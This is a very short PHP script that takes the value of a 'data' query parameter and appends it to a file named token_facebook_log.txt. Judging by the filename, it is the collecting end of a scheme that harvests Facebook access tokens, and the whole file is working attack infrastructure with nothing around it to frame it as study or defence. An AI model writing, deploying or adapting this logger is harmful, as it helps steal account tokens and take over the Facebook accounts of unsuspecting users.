<?php
$file = fopen("token_facebook_log.txt","a");
fwrite($file,@$_GET['data']."\n");
fclose($file);
?>